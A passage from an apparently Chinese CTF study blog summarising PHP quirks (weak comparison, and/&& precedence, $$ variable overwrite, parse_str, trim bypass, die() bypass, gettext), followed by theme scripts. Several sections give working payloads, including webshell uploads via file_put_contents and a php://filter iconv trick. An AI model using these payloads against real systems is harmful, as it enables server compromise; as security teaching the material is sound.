+<h2 id="php弱类型比较"><a href="#php弱类型比较" class="headerlink" title="php弱类型比较"></a>php弱类型比较</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$allow = array();<br>for ($i=36; $i &lt; 0x36d; $i++) &#123;<br>    array_push($allow, rand(1,$i));<br>&#125;<br>if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;<br>    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload:<br>GET 请求: ?n=1.php   //1可替换成其他数字进行尝试<br>POST 请求: content=&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>如：</p>
+<p>假设我们找到了合法的 <code>$_GET[&#39;n&#39;]=123</code>，我们可以上传 Webshell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST /vuln.php?n=123 HTTP/1.1<br>Host: target.com<br>Content-Type: application/x-www-form-urlencoded<br><br>content=&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>然后访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://target.com/123?cmd=whoami<br></code></pre></td></tr></table></figure>
+
+<h2 id="and与-的区别"><a href="#and与-的区别" class="headerlink" title="and与&amp;&amp;的区别"></a>and与&amp;&amp;的区别</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$a = false &amp;&amp; true;<br>$b = false and true;<br><br>var_dump($a); // 输出: false<br>var_dump($b); // 输出: true<br></code></pre></td></tr></table></figure>
+
+<p><code>false &amp;&amp; true</code> 先计算 <code>false &amp;&amp; true</code>（结果是 <code>false</code>），然后赋值给 <code>$a</code>。</p>
+<p><code>false and true</code> 先执行 <code>$b = false</code>，然后 <code>true</code> 没有影响。</p>
+<h2 id="PHP双-（-）的变量覆盖"><a href="#PHP双-（-）的变量覆盖" class="headerlink" title="PHP双$（$$）的变量覆盖"></a>PHP双$（$$）的变量覆盖</h2><p>在双写$的时候，属于动态变量，就是后面的变量值作为新的变量名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$test=&quot;a23&quot;; $test等于a23<br>$$test=456; $$test也就等于$a23,这里相当于给$a23赋值了<br>echo $test; 正常输出$test为a23<br>echo $$test; 这里输出$$test，就是$a23，为456<br></code></pre></td></tr></table></figure>
+
+<h2 id="parse-str函数的使用"><a href="#parse-str函数的使用" class="headerlink" title="parse_str函数的使用"></a>parse_str函数的使用</h2><p>parse_str会把字符串解析为变量，大部分是传入的多个值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$a=&quot;q=123&amp;p=456&quot;;<br>parse_str($a);<br>echo $q; 输出123<br>echo $p; 输出456<br>parse_str($a,$b); 第二个参数作为数组，解析的变量都存入这个数组中<br>echo $b[&#x27;q&#x27;]; 输出123<br>echo $b[&#x27;p&#x27;]; 输出456<br></code></pre></td></tr></table></figure>
+
+<h2 id="trim函数的绕过-is-numeric绕过"><a href="#trim函数的绕过-is-numeric绕过" class="headerlink" title="trim函数的绕过+is_numeric绕过"></a>trim函数的绕过+is_numeric绕过</h2><p><code>trim()</code> 函数用于去除字符串两端的空白字符（包括空格、制表符、换行符等）</p>
+<p>trim默认时没有剔除<code>%0c</code>（换页符）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27;)&#123;<br>    if($num==&#x27;36&#x27;)&#123;<br>        echo $flag;<br>    &#125;else&#123;<br>        echo &quot;hacker!!&quot;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload: num=%0c36<br></code></pre></td></tr></table></figure>
+
+<h2 id="绕过死亡die"><a href="#绕过死亡die" class="headerlink" title="绕过死亡die"></a>绕过死亡die</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">function filter($x)&#123;<br>    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$<br>    x))&#123;<br>        die(&#x27;too young too simple sometimes naive!&#x27;);<br>    &#125;<br>&#125;<br>$file=$_GET[&#x27;file&#x27;];<br>$contents=$_POST[&#x27;contents&#x27;];<br>filter($file);<br>file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload:<br>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php<br>post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?<br></code></pre></td></tr></table></figure>
+
+<p>这会将字符两位两位交换，file_put_contents在写入的时候会破坏那句die，但contents那句恢复原貌，</p>
+<p>可以执行</p>
+<h2 id="gettext拓展的使用"><a href="#gettext拓展的使用" class="headerlink" title="gettext拓展的使用"></a>gettext拓展的使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var_dump(call_user_func($f1,$f2));<br></code></pre></td></tr></table></figure>
+
+<p>如以上代码，多重过滤后，f1可以为 gettext ，f2可以为 phpinfo ，如果过滤更为严格，更改ini文件里</p>
+<p>的拓展后， _() 等效于 gettext()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>echo gettext(&quot;phpinfo&quot;);<br>结果 phpinfo<br>echo _(&quot;phpinfo&quot;);<br>结果 phpinfo<br></code></pre></td></tr></table></figure>
+
+<p><a href="%5Cpdf%5CPHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93.pdf">php特性总结</a></p>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/07/09/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">PHP文件包含漏洞</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/07/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Hackun</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93"><span class="toc-text">PHP特性总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-text">数组绕过正则表达式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intval%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">intval函数的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-text">正则表达式修饰符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#highlight-file%E8%B7%AF%E5%BE%84"><span class="toc-text">highlight_file路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5%E6%AF%94%E8%BE%83%E7%BC%BA%E9%99%B7"><span class="toc-text">md5比较缺陷</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#md5%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-text">md5弱比较</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BC%BA%E7%9B%B8%E7%AD%89%EF%BC%88-%EF%BC%89"><span class="toc-text">不同数据强相等（&#x3D;&#x3D;&#x3D;）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BC%B1%E7%9B%B8%E7%AD%89%EF%BC%88-%EF%BC%89"><span class="toc-text">不同数据弱相等（&#x3D;&#x3D;）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A7%91%E5%AD%A6%E8%AE%B0%E6%95%B0%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-text">科学记数法绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5%E5%BC%BA%E7%A2%B0%E6%92%9E"><span class="toc-text">md5强碰撞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sha1%E6%AF%94%E8%BE%83%E7%BC%BA%E9%99%B7"><span class="toc-text">sha1比较缺陷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6%E7%9A%84%E7%90%86%E8%A7%A3-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">三目运算符的理解+变量覆盖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-text">php弱类型比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#and%E4%B8%8E-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">and与&amp;&amp;的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8F%8C-%EF%BC%88-%EF%BC%89%E7%9A%84%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">PHP双$（$$）的变量覆盖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#parse-str%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">parse_str函数的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#trim%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87-is-numeric%E7%BB%95%E8%BF%87"><span class="toc-text">trim函数的绕过+is_numeric绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1die"><span class="toc-text">绕过死亡die</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gettext%E6%8B%93%E5%B1%95%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">gettext拓展的使用</span></a></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function (response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function (data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function (error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+<!-- required -->
+<script src="/js/main.js?v=1.29.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
